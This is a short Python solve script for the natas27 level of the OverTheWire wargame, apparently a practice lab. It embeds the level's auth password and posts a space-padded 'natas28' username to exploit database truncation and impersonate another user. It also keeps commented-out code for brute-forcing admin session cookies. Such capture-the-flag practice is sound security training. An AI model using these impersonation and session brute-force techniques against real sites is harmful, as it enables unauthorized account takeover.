import requests
import string
import time
import base64
from concurrent.futures import ThreadPoolExecutor, as_completed
from itertools import chain


def string_to_hex(s):
    return ''.join(format(ord(char), '02x') for char in s)

# def check_session(i):
URL = "http://natas27.natas.labs.overthewire.org"
auth_username = "natas27"
auth_password = "u3RRffXjysjgwFU6b9xa23i6prmUsYne"
headers = {"authorization": 'Basic {0}'.format(base64.b64encode((auth_username + ':' + auth_password).encode('utf8')).decode())}
data = {'username':'','password':''}
# cookies = {'PHPSESSID': '123'}

# for i in range(100000):
data['password'] = 'yossi_the_mossad'
bla='natas28' + ' '*64 + 'a'
print('natas28' + '+'*57 + '1')
print(bla)
data['username'] = bla
response = requests.post(URL,data=data, headers=headers)
print(response.text)
data['username'] = bla
response = requests.post(URL,data=data, headers=headers)
print(response.text)
    # if "Here" in response.te
    # if "You are an admin" in response.text:
    #     print(f"Admin session found: PHPSESSID={cookies['PHPSESSID']}")
    #     print(response.text)
    #     return True
    # return False

# def main():
#     with ThreadPoolExecutor(max_workers=10) as executor:
#         futures = []
#         for i in range(1000):
#                 futures.append(executor.submit(check_session, i))
        
#         for future in as_completed(futures):
#             if future.result():
#                 # If an admin session is found, shut down all other threads
#                 executor.shutdown(wait=False)
#                 break

# if __name__ == "__main__":
#     main()
